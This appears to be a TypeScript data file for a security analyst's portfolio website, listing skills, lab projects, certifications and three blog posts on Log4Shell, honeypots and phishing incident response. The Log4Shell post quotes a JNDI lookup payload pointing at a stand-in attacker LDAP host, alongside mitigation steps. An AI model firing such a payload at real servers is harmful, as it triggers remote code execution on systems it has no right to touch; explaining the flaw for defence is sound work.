import { SkillCategory, Project, Certification, BlogPost } from './types';

export const SKILL_CATEGORIES: SkillCategory[] = [
  {
    title: 'Security Tools & Platforms',
    skills: [
      { name: 'Wireshark' },
      { name: 'Nmap' },
      { name: 'Metasploit' },
      { name: 'Burp Suite' },
      { name: 'Splunk' },
      { name: 'Nessus' },
      { name: 'Snort' },
      { name: 'Suricata' },
    ],
  },
  {
    title: 'Operating Systems & Networks',
    skills: [
        { name: 'Linux (Kali, Ubuntu)' },
        { name: 'Windows Server' },
        { name: 'Active Directory' },
        { name: 'TCP/IP Suite' },
        { name: 'Firewalls & VPNs' },
        { name: 'DNS, DHCP, HTTP/S' },
    ],
  },
  {
    title: 'Programming & Scripting',
    skills: [
        { name: 'Python' },
        { name: 'Bash' },
        { name: 'PowerShell' },
    ],
  },
  {
    title: 'Cybersecurity Concepts',
    skills: [
        { name: 'Incident Response' },
        { name: 'Vulnerability Assessment' },
        { name: 'Threat Intelligence' },
        { name: 'SIEM' },
        { name: 'Phishing Analysis' },
        { name: 'Cryptography' },
        { name: 'OWASP Top 10' },
        { name: 'MITRE ATT&CK' },
    ],
  },
];

export const PROJECTS: Project[] = [
    {
        title: 'Home Lab Network Security Monitoring',
        description: 'Designed and built a virtual home lab to simulate a small corporate network. Deployed Security Onion with Suricata for IDS/IPS and analyzed network traffic for malicious activity. Used Splunk to ingest logs and create dashboards for monitoring security events.',
        tags: ['Security Onion', 'Suricata', 'Splunk', 'VirtualBox', 'Network Analysis'],
        link: 'https://github.com/your-username/homelab-project'
    },
    {
        title: 'Phishing Campaign Analysis',
        description: 'Conducted a deep-dive analysis of a simulated phishing email. Extracted indicators of compromise (IOCs) from email headers, URLs, and attachments. Documented findings in a detailed report, outlining the threat actor\'s tactics and providing remediation recommendations.',
        tags: ['Phishing Analysis', 'Email Security', 'IOCs', 'Threat Intelligence'],
    },
    {
        title: 'Vulnerability Assessment & Penetration Test',
        description: 'Performed a comprehensive vulnerability scan on a test network using Nessus. Identified and validated critical vulnerabilities, then exploited a misconfigured web server using Metasploit to gain initial access. Prepared a professional report detailing the findings and mitigation strategies.',
        tags: ['Nessus', 'Metasploit', 'Vulnerability Assessment', 'Penetration Testing'],
        link: 'https://github.com/your-username/pentest-report'
    },
];

export const CERTIFICATIONS: Certification[] = [
    {
        name: 'CompTIA Security+',
        issuer: 'CompTIA',
        date: 'Issued June 2023',
        credentialId: 'COMP001021112233'
    },
    {
        name: 'CompTIA Network+',
        issuer: 'CompTIA',
        date: 'Issued Dec 2022',
        credentialId: 'COMP001021112244'
    },
    {
        name: '(ISC)² Certified in Cybersecurity (CC)',
        issuer: '(ISC)²',
        date: 'Issued March 2023',
    }
];

export const BLOG_POSTS: BlogPost[] = [
  {
    title: 'Deconstructing the Log4j Vulnerability',
    publicationDate: 'October 26, 2023',
    summary: 'A deep dive into the Log4Shell vulnerability (CVE-2021-44228), how it works, its impact, and the mitigation strategies that proved effective.',
    tags: ['Vulnerability Analysis', 'Log4j', 'CVE', 'Java'],
    slug: 'deconstructing-log4j',
    content: `The Log4Shell vulnerability, officially designated CVE-2021-44228, sent shockwaves through the cybersecurity community in late 2021. It was a critical remote code execution (RCE) vulnerability found in Apache Log4j, a widely used Java logging library. Its simplicity to exploit and the ubiquity of Log4j made it one of the most severe vulnerabilities discovered in recent years.\n\nThe flaw stemmed from how Log4j handled JNDI (Java Naming and Directory Interface) lookups in log messages. An attacker could craft a malicious string, such as \`\${jndi:ldap://attacker.com/a}\`, and have it logged by a vulnerable application. Log4j would interpret this string, connect to the attacker-controlled LDAP server, and execute the returned Java code. This gave attackers a direct path to take full control of affected servers.\n\nMitigation involved several key steps. The most immediate was to update Log4j to a patched version (2.15.0 or higher) where JNDI lookups were disabled by default. For systems that couldn't be updated immediately, temporary fixes included setting the system property \`log4j2.formatMsgNoLookups\` to \`true\` or removing the JndiLookup class from the classpath. This incident highlighted the critical importance of software supply chain security and the need for robust vulnerability management programs.`
  },
  {
    title: 'A Beginner\'s Guide to Setting Up a Honeypot',
    publicationDate: 'September 15, 2023',
    summary: 'Learn how to set up a low-interaction honeypot to capture and analyze automated attack traffic. This guide covers the basics of architecture and tools.',
    tags: ['Honeypot', 'Threat Intelligence', 'Linux'],
    slug: 'beginners-guide-honeypot',
    content: `A honeypot is a decoy computer system designed to attract and trap cyberattackers. By mimicking a legitimate target, it can provide valuable threat intelligence about attackers' methods and tools without risking actual production systems. For beginners, a low-interaction honeypot is the perfect starting point.\n\nUnlike high-interaction honeypots that emulate full operating systems, low-interaction honeypots only simulate specific services and protocols (e.g., SSH, Telnet, HTTP). This makes them safer and easier to deploy. One of the most popular tools for this is T-Pot, which bundles several honeypot daemons like Cowrie (for SSH/Telnet) and Honeytrap into a single, easy-to-manage Docker-based system.\n\nSetting one up is straightforward. You'll need a dedicated machine or a cloud VM (like a small DigitalOcean droplet or AWS EC2 instance). It's crucial to isolate this system from your primary network. After installing the OS (usually Debian or Ubuntu), you can clone the T-Pot repository from GitHub and run its installation script. Once active, it will immediately start logging brute-force attempts and other malicious traffic, which you can visualize through its built-in Elastic Stack (ELK) dashboard. Analyzing these logs can give you firsthand insight into the automated threats constantly scanning the internet.`
  },
  {
    title: 'Incident Response 101: Phishing Attack Walkthrough',
    publicationDate: 'August 02, 2023',
    summary: 'A simulated incident response scenario for a corporate phishing attack, covering the key phases from detection and containment to eradication and recovery.',
    tags: ['Incident Response', 'Phishing', 'SIEM'],
    slug: 'ir-phishing-walkthrough',
    content: `Imagine this scenario: an employee reports a suspicious email, and your Security Information and Event Management (SIEM) system simultaneously alerts on a strange outbound connection from their workstation. This is where the incident response (IR) process begins. The six phases are Preparation, Identification, Containment, Eradication, Recovery, and Lessons Learned.\n\n**Identification:** Your first step is to confirm a genuine incident. You analyze the reported email and find a malicious link. Correlating with SIEM logs, you confirm the employee clicked the link, which led to a malware download. The workstation is now compromised.\n\n**Containment:** The immediate priority is to stop the bleeding. You disconnect the affected workstation from the network to prevent the malware from spreading. You also block the malicious domain and IP address on the firewall and web proxy.\n\n**Eradication:** This phase involves removing the threat actor from the environment. The compromised machine needs to be wiped and re-imaged from a known good source. You also check other systems for similar indicators of compromise (IOCs) to ensure the infection hasn't spread.\n\n**Recovery:** Once you're confident the threat is gone, you can restore the system to normal operation. The re-imaged workstation is reconnected to the network, and data is restored from backups if necessary. You continue to monitor the environment closely for any signs of reinfection.\n\n**Lessons Learned:** Finally, you conduct a post-mortem to understand what happened, why it happened, and how you can prevent it from happening again. This might lead to improved security awareness training, new email filtering rules, or enhanced endpoint detection capabilities.`
  }
];


export const NAV_LINKS = [
    { name: 'About', href: '#about' },
    { name: 'Skills', href: '#skills' },
    { name: 'Projects', href: '#projects' },
    { name: 'Certifications', href: '#certifications' },
    { name: 'Blog', href: '#blog' },
    { name: 'Contact', href: '#contact' },
];